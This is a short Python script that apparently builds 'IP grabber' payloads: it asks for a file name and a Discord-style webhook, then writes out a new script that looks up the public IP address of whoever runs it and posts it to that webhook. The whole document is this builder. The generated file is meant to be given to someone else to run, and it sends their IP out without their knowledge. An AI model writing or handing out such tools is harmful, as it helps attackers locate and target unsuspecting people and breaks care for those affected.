import requests


name = input("Enter File Name: ")
while True:
    try:
        webhook = input("Enter Webhook: ")
        r = requests.get(webhook)
        if "200" in str(r):
            break
        if "200" not in str(r):
            print("Webhook Invalid")
    except Exception:
        print("Webhook Invalid")
file = open(f"{name}.py", "a")
file.write("import requests\n")
file.write(f'webhook = "{webhook}"\n')
file.write('url = "https://api.ipify.org"\n')
file.write("r = requests.get(url).text\n")
file.write("r = str(r)\n")
file.write('requests.post(webhook, json={"content": f"@everyone Ip: {r}"})')
file.close()
